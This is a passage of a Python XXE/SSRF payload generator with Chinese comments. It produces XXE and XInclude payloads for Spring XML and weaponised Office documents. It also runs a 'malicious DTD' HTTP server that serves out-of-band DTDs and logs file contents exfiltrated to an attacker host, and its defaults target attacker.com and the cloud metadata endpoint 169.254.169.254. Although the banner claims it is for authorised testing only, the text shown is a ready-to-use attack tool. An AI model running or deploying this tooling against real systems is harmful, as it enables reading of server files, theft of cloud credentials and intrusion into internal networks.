<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xi="http://www.w3.org/2001/XInclude">
  <bean id="xincludeTest" class="java.lang.String">
    <constructor-arg>
      <value>
        <xi:include parse="text" href="{self.target_file_uri}"/>
      </value>
    </constructor-arg>
  </bean>
</beans>'''

        return [
            {
                "name": "spring_beans_xxe_file_entity",
                "payload": spring_basic,
                "technique": "Spring XML XXE",
                "description": "Spring beans XML 中使用外部实体。",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": [
                    "应用加载用户可控 Spring XML",
                    "底层 XML 解析器允许 DOCTYPE 和外部实体"
                ]
            },
            {
                "name": "spring_beans_schema_location_ssrf",
                "payload": spring_schema_ssrf,
                "technique": "Spring XML SchemaLocation SSRF",
                "description": "Spring beans 的 xsi:schemaLocation 触发远程 XSD 加载。",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": [
                    "Spring XML 解析过程启用 Schema 解析",
                    "允许远程加载 XSD"
                ]
            },
            {
                "name": "spring_beans_xinclude_file_read",
                "payload": spring_xinclude,
                "technique": "Spring XML XInclude",
                "description": "Spring XML 中使用 XInclude。",
                "content_type": "application/xml",
                "file_ext": ".xml",
                "requirements": [
                    "底层 XML 解析器启用 XInclude"
                ]
            }
        ]

    # ----------------------------------------------------------------------
    # 综合生成
    # ----------------------------------------------------------------------

    def generate_scenario_payloads(self) -> Dict[str, List[Dict]]:
        return {
            "soap": self.generate_soap_payloads(),
            "svg": self.generate_svg_payloads(),
            "office": self.generate_office_payloads(),
            "saml": self.generate_saml_payloads(),
            "rss_atom": self.generate_rss_atom_payloads(),
            "webdav": self.generate_webdav_payloads(),
            "spring_xml": self.generate_spring_xml_payloads(),
        }

    def generate_all_payloads(self) -> Dict[str, List[Dict]]:
        return {
            "basic": [self.generate_basic_file_entity_payload()],
            "local_dtd": self.generate_local_dtd_payload(),
            "error_based": [self.generate_error_based_payload()],
            "blind_ssrf": self.generate_blind_ssrf_payload(),
            "xinclude": self.generate_xinclude_payload(),
            "schema_ssrf": self.generate_schema_ssrf_payload(),
            "soap": self.generate_soap_payloads(),
            "svg": self.generate_svg_payloads(),
            "office": self.generate_office_payloads(),
            "saml": self.generate_saml_payloads(),
            "rss_atom": self.generate_rss_atom_payloads(),
            "webdav": self.generate_webdav_payloads(),
            "spring_xml": self.generate_spring_xml_payloads(),
        }


# ============================================================================
# 第四部分：OOXML 文件生成
# ============================================================================

def create_ooxml_package(kind: str, custom_xml_payload: str, output_path: str):
    """
    生成最小 OOXML 文档包，并把 Payload 放入 customXml/item1.xml。

    kind:
        docx / xlsx / pptx
    """
    kind = kind.lower()

    if kind not in {"docx", "xlsx", "pptx"}:
        raise ValueError(f"Unsupported OOXML kind: {kind}")

    with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as z:
        # 通用 Content Types
        z.writestr("[Content_Types].xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
</Types>''')

        # 根关系
        if kind == "docx":
            z.writestr("_rels/.rels", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml"
    Target="customXml/item1.xml"/>
</Relationships>''')

            z.writestr("word/document.xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>OOXML XXE test document</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>''')

        elif kind == "xlsx":
            z.writestr("_rels/.rels", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="xl/workbook.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml"
    Target="customXml/item1.xml"/>
</Relationships>''')

            z.writestr("xl/workbook.xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets/>
</workbook>''')

        elif kind == "pptx":
            z.writestr("_rels/.rels", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="ppt/presentation.xml"/>
  <Relationship Id="rId2"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml"
    Target="customXml/item1.xml"/>
</Relationships>''')

            z.writestr("ppt/presentation.xml", '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
</p:presentation>''')

        # 自定义 XML Payload
        z.writestr("customXml/item1.xml", custom_xml_payload)


# ============================================================================
# 第五部分：恶意 DTD HTTP 服务
# ============================================================================

class MaliciousDTDHandler(SimpleHTTPRequestHandler):
    target_file = "/etc/hostname"
    log_file = "callbacks.jsonl"

    def do_GET(self):
        event = {
            "time": now_string(),
            "path": self.path,
            "source_ip": self.client_address[0],
            "source_port": self.client_address[1],
            "user_agent": self.headers.get("User-Agent", "N/A"),
            "host": self.headers.get("Host", "N/A"),
        }

        print(f"\n{'=' * 70}")
        print(f"[+] 收到请求: {event['path']}")
        print(f"    来源: {event['source_ip']}:{event['source_port']}")
        print(f"    Host: {event['host']}")
        print(f"    User-Agent: {event['user_agent']}")

        if "?data=" in self.path or "?d=" in self.path:
            if "?data=" in self.path:
                data_part = self.path.split("?data=", 1)[-1]
            else:
                data_part = self.path.split("?d=", 1)[-1]
            event["exfil_data"] = data_part
            print(f"    [!] 可能的外带数据: {data_part}")

        print(f"{'=' * 70}\n")

        self._append_log(event)

        if self.path.startswith("/evil.dtd"):
            content = self._get_error_based_dtd()
            self._send_text(content, "application/xml-dtd")
            return

        if self.path.startswith("/oob.dtd"):
            content = self._get_oob_dtd()
            self._send_text(content, "application/xml-dtd")
            return

        if self.path.startswith("/ping"):
            self._send_text("pong\n", "text/plain")
            return

        self._send_text("OK\n", "text/plain")

    def _append_log(self, event: Dict):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(event, ensure_ascii=False) + "\n")
        except OSError:
            pass

    def _send_text(self, content: str, content_type: str = "text/plain"):
        data = content.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _get_error_based_dtd(self) -> str:
        file_uri = normalize_file_uri(self.target_file)
        return (
            f'<!ENTITY % file SYSTEM "{file_uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            f'\'file:///nonexistent_xxe_error/&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%error;\n'
        )

    def _get_oob_dtd(self) -> str:
        file_uri = normalize_file_uri(self.target_file)
        server_host = self.headers.get("Host", "attacker.com")
        return (
            f'<!ENTITY % file SYSTEM "{file_uri}">\n'
            f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
            f'\'http://{server_host}/?data=&#x25;file;\'>">\n'
            f'%eval;\n'
            f'%exfil;\n'
        )

    def log_message(self, format, *args):
        pass


def start_dtd_server(port: int, target_file: str, bind: str = "0.0.0.0", log_file: str = "callbacks.jsonl"):
    MaliciousDTDHandler.target_file = target_file
    MaliciousDTDHandler.log_file = log_file

    try:
        server = ThreadingHTTPServer((bind, port), MaliciousDTDHandler)
    except OSError as e:
        print(f"[!] DTD Server 启动失败: {e}")
        return

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║              增强版 XXE DTD HTTP Server 已启动              ║
╠══════════════════════════════════════════════════════════════╣
║  监听地址: {bind}:{port:<5}
║  目标文件: {target_file}
║  日志文件: {log_file}
║
║  可用端点:
║    /evil.dtd   - Error-Based XXE DTD
║    /oob.dtd    - OOB DTD
║    /ping       - 连通性测试
║
║  按 Ctrl+C 停止服务器
╚══════════════════════════════════════════════════════════════╝
""")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()


# ============================================================================
# 第六部分：报告和保存
# ============================================================================

class ReportHelper:
    @staticmethod
    def generate_text_report(results: Dict[str, List[Dict]]) -> str:
        lines = []
        lines.append("=" * 80)
        lines.append("增强版 XXE/SSRF Payload 生成报告")
        lines.append("=" * 80)

        total = 0

        for category, payloads in results.items():
            if not payloads:
                continue

            lines.append("")
            lines.append("-" * 80)
            lines.append(f"[{category}] 共 {len(payloads)} 个 Payload")
            lines.append("-" * 80)

            for index, p in enumerate(payloads, 1):
                total += 1
                lines.append("")
                lines.append(f"{index}. {p.get('name', 'unnamed')}")
                lines.append(f"   技术: {p.get('technique', 'N/A')}")
                lines.append(f"   说明: {p.get('description', '')}")

                if p.get("content_type"):
                    lines.append(f"   Content-Type: {p.get('content_type')}")

                if p.get("method"):
                    lines.append(f"   HTTP Method: {p.get('method')}")

                if p.get("confidence"):
                    lines.append(f"   可信度: {p.get('confidence')}")

                reqs = p.get("requirements", [])
                if reqs:
                    lines.append("   前提条件:")
                    for r in reqs:
                        lines.append(f"     - {r}")

                payload = p.get("payload", "")
                if payload:
                    preview = payload[:300] + "..." if len(payload) > 300 else payload
                    lines.append("   Payload 预览:")
                    for line in preview.splitlines():
                        lines.append(f"     {line}")

        lines.append("")
        lines.append("=" * 80)
        lines.append(f"总计生成 {total} 个 Payload")
        lines.append("=" * 80)

        return "\n".join(lines)


def save_payloads_to_files(results: Dict[str, List[Dict]], output_dir: str):
    ensure_dir(output_dir)

    for category, payloads in results.items():
        if not payloads:
            continue

        category_dir = os.path.join(output_dir, safe_filename(category))
        ensure_dir(category_dir)

        for index, p in enumerate(payloads, 1):
            name = safe_filename(p.get("name", f"payload_{index}"))
            payload = p.get("payload", "")
            file_ext = p.get("file_ext", ".xml")

            # OOXML 文件特殊处理
            if p.get("ooxml_kind"):
                kind = p["ooxml_kind"]
                file_path = os.path.join(category_dir, f"{index:02d}_{name}.{kind}")
                try:
                    create_ooxml_package(kind, payload, file_path)
                except Exception as e:
                    print(f"[!] 生成 OOXML 文件失败: {file_path} - {e}")
                    continue
            else:
                file_path = os.path.join(category_dir, f"{index:02d}_{name}{file_ext}")
                try:
                    with open(file_path, "w", encoding="utf-8") as f:
                        f.write(payload)
                except OSError as e:
                    print(f"[!] 保存 Payload 失败: {file_path} - {e}")
                    continue

            # 保存 evil.dtd
            if p.get("evil_dtd"):
                dtd_path = os.path.join(category_dir, f"{index:02d}_{name}_evil.dtd")
                try:
                    with open(dtd_path, "w", encoding="utf-8") as f:
                        f.write(p["evil_dtd"])
                except OSError as e:
                    print(f"[!] 保存 DTD 失败: {dtd_path} - {e}")

            # 保存注入片段
            if p.get("injection_fragment"):
                frag_path = os.path.join(category_dir, f"{index:02d}_{name}_fragment.txt")
                try:
                    with open(frag_path, "w", encoding="utf-8") as f:
                        f.write(p["injection_fragment"])
                except OSError as e:
                    print(f"[!] 保存 Fragment 失败: {frag_path} - {e}")

            # 保存 metadata
            meta_path = os.path.join(category_dir, f"{index:02d}_{name}_meta.json")
            meta = dict(p)
            if "payload" in meta:
                meta["payload"] = "[saved separately]"
            if "evil_dtd" in meta:
                meta["evil_dtd"] = "[saved separately]"
            try:
                with open(meta_path, "w", encoding="utf-8") as f:
                    json.dump(meta, f, ensure_ascii=False, indent=2)
            except OSError:
                pass

    report = ReportHelper.generate_text_report(results)
    report_path = os.path.join(output_dir, "report.txt")
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(report)
    except OSError as e:
        print(f"[!] 保存报告失败: {e}")

    print(f"[+] Payload 已保存到: {output_dir}")
    print(f"[+] 报告已保存到: {report_path}")


# ============================================================================
# 第七部分：命令行界面
# ============================================================================

def print_banner():
    banner = r"""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║      Enhanced XXE / SSRF Payload Generator                           ║
║                                                                      ║
║      支持场景:                                                       ║
║        SOAP | SVG | Office OOXML | SAML | RSS/Atom | WebDAV | Spring  ║
║                                                                      ║
║      仅用于授权安全测试、靶场验证、内部合规评估                      ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def list_modes():
    text = """
可用模式:

基础模式:
  basic          基础外部实体 Payload
  local_dtd      Local DTD Reuse
  error_based    Error-Based XXE，需要远程 DTD
  blind_ssrf     Blind SSRF
  xinclude       XInclude
  schema_ssrf    Schema Location SSRF
  auto           生成全部基础 + 场景 Payload

新增场景模式:
  soap           SOAP 1.1 / SOAP 1.2
  svg            SVG 上传/转换/预览
  office         OOXML 文档: docx/xlsx/pptx
  saml           SAML Response
  rss_atom       RSS / Atom Feed
  webdav         WebDAV / CalDAV
  spring_xml     Spring XML 配置
  scenario_auto  仅生成所有新增业务场景 Payload

服务模式:
  --serve        启动恶意 DTD HTTP Server

常用参数:
  --target-file  要测试读取的目标文件，默认 /etc/hostname
  --attacker-url 外部 DTD Server 地址
  --ssrf-url     SSRF 目标 URL
  --platform     java/dotnet/php
  --os           linux/windows
  -o/--output    输出目录
  --json         JSON 输出
"""
    print(text)


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="增强版 XXE/SSRF Payload 生成工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
示例:
  python %(prog)s --mode soap --target-file /etc/hostname
  python %(prog)s --mode svg --target-file /etc/hostname -o ./svg_payloads
  python %(prog)s --mode office --target-file /etc/hostname -o ./office_payloads
  python %(prog)s --mode saml --target-file /etc/hostname
  python %(prog)s --mode scenario_auto -o ./scenario_payloads
  python %(prog)s --serve --port 8080 --target-file /etc/hostname
        """)
    )

    parser.add_argument(
        "--mode", "-m",
        choices=[
            "basic",
            "local_dtd",
            "error_based",
            "blind_ssrf",
            "xinclude",
            "schema_ssrf",
            "soap",
            "svg",
            "office",
            "saml",
            "rss_atom",
            "webdav",
            "spring_xml",
            "scenario_auto",
            "auto",
        ],
        help="Payload 生成模式"
    )

    parser.add_argument("--list", "-l", action="store_true", help="列出可用模式")
    parser.add_argument("--platform", "-p", default="java", choices=["java", "dotnet", "php"], help="目标平台")
    parser.add_argument("--os", default="linux", choices=["linux", "windows"], help="目标操作系统")
    parser.add_argument("--target-file", "-f", default="/etc/hostname", help="要测试读取的目标文件")
    parser.add_argument("--attacker-url", "-a", default="http://attacker.com", help="攻击者 DTD Server 地址")
    parser.add_argument("--ssrf-url", "-s", default="http://169.254.169.254/latest/meta-data/", help="SSRF 目标 URL")
    parser.add_argument("--output", "-o", default="./xxe_payloads_enhanced", help="输出目录")
    parser.add_argument("--json", action="store_true", help="JSON 输出")

    parser.add_argument("--serve", action="store_true", help="启动 DTD HTTP Server")
    parser.add_argument("--bind", default="0.0.0.0", help="DTD Server 绑定地址")
    parser.add_argument("--port", type=int, default=8080, help="DTD Server 端口")
    parser.add_argument("--log-file", default="callbacks.jsonl", help="DTD Server 回连日志文件")

    return parser


def payloads_to_jsonable(payloads: List[Dict]) -> List[Dict]:
    output = []
    for p in payloads:
        item = {
            "name": p.get("name"),
            "technique": p.get("technique"),
            "description": p.get("description"),
            "payload": p.get("payload"),
            "evil_dtd": p.get("evil_dtd"),
            "injection_fragment": p.get("injection_fragment"),
            "content_type": p.get("content_type"),
            "method": p.get("method"),
            "headers": p.get("headers"),
            "file_ext": p.get("file_ext"),
            "ooxml_kind": p.get("ooxml_kind"),
            "requirements": p.get("requirements", []),
        }
        output.append(item)
    return output


def generate_by_mode(generator: XXEPayloadGenerator, mode: str) -> Dict[str, List[Dict]]:
    if mode == "basic":
        return {"basic": [generator.generate_basic_file_entity_payload()]}

    if mode == "local_dtd":
        return {"local_dtd": generator.generate_local_dtd_payload()}

    if mode == "error_based":
        return {"error_based": [generator.generate_error_based_payload()]}

    if mode == "blind_ssrf":
        return {"blind_ssrf": generator.generate_blind_ssrf_payload()}

    if mode == "xinclude":
        return {"xinclude": generator.generate_xinclude_payload()}

    if mode == "schema_ssrf":
        return {"schema_ssrf": generator.generate_schema_ssrf_payload()}

    if mode == "soap":
        return {"soap": generator.generate_soap_payloads()}

    if mode == "svg":
        return {"svg": generator.generate_svg_payloads()}

    if mode == "office":
        return {"office": generator.generate_office_payloads()}

    if mode == "saml":
        return {"saml": generator.generate_saml_payloads()}

    if mode == "rss_atom":
        return {"rss_atom": generator.generate_rss_atom_payloads()}

    if mode == "webdav":
        return {"webdav": generator.generate_webdav_payloads()}

    if mode == "spring_xml":
        return {"spring_xml": generator.generate_spring_xml_payloads()}

    if mode == "scenario_auto":
        return generator.generate_scenario_payloads()

    if mode == "auto":
        return generator.generate_all_payloads()

    raise ValueError(f"Unsupported mode: {mode}")


def print_payloads(results: Dict[str, List[Dict]]):
    print(ReportHelper.generate_text_report(results))

    for category, payloads in results.items():
        if not payloads:
            continue

        print(f"\n{'#' * 80}")
        print(f"# CATEGORY: {category}")
        print(f"{'#' * 80}")

        for i, p in enumerate(payloads, 1):
            print(f"\n{'=' * 80}")
            print(f"[{i}] {p.get('name', 'unnamed')}")
            print(f"技术: {p.get('technique', 'N/A')}")
            print(f"说明: {p.get('description', '')}")

            if p.get("method"):
                print(f"HTTP Method: {p.get('method')}")

            if p.get("content_type"):
                print(f"Content-Type: {p.get('content_type')}")

            if p.get("headers"):
                print("建议 Headers:")
                print(json.dumps(p.get("headers"), ensure_ascii=False, indent=2))

            if p.get("ooxml_kind"):
                print(f"OOXML 类型: {p.get('ooxml_kind')}")
                print("说明: 控制台仅展示内部 customXml/item1.xml 内容，保存时会生成真实 Office 文件。")

            print("\n--- Payload ---")
            print(textwrap.indent(p.get("payload", ""), "  "))

            if p.get("evil_dtd"):
                print("\n--- evil.dtd ---")
                print(textwrap.indent(p.get("evil_dtd", ""), "  "))

            if p.get("base64_saml"):
                print("\n--- Base64 SAMLResponse ---")
                print(textwrap.indent(p.get("base64_saml", ""), "  "))

            if p.get("requirements"):
                print("\n前提条件:")
                for r in p["requirements"]:
                    print(f"  - {r}")


def main():
    print_banner()
    parser = build_arg_parser()
    args = parser.parse_args()

    if args.list:
        list_modes()
        return

    if args.serve:
        start_dtd_server(
            port=args.port,
            target_file=args.target_file,
            bind=args.bind,
            log_file=args.log_file
        )
        return

    if not args.mode:
        parser.print_help()
        print("\n[!] 请指定 --mode，或使用 --list 查看可用模式。")
        return

    generator = XXEPayloadGenerator(
        target_file=args.target_file,
        attacker_url=args.attacker_url,
        ssrf_url=args.ssrf_url,
        target_os=args.os,
        platform=args.platform
    )

    try:
        results = generate_by_mode(generator, args.mode)
    except ValueError as e:
        print(f"[!] {e}")
        return

    has_payload = any(bool(v) for v in results.values())
    if not has_payload:
        print(f"[!] 没有生成任何 Payload。mode={args.mode}, platform={args.platform}, os={args.os}")
        return

    if args.json:
        json_output = {
            category: payloads_to_jsonable(payloads)
            for category, payloads in results.items()
        }
        print(json.dumps(json_output, ensure_ascii=False, indent=2))
        return

    print_payloads(results)

    # 场景类和 auto 默认保存到文件，方便拿到 SVG/Office/SAML 等文件
    if args.mode in {
        "office",
        "svg",
        "saml",
        "soap",
        "rss_atom",
        "webdav",
        "spring_xml",
        "scenario_auto",
        "auto",
    }:
        save_payloads_to_files(results, args.output)
    else:
        print(f"\n[*] 如需保存到文件，可使用 -o {args.output}，或使用 auto/scenario_auto 模式。")


if __name__ == "__main__":
    main()

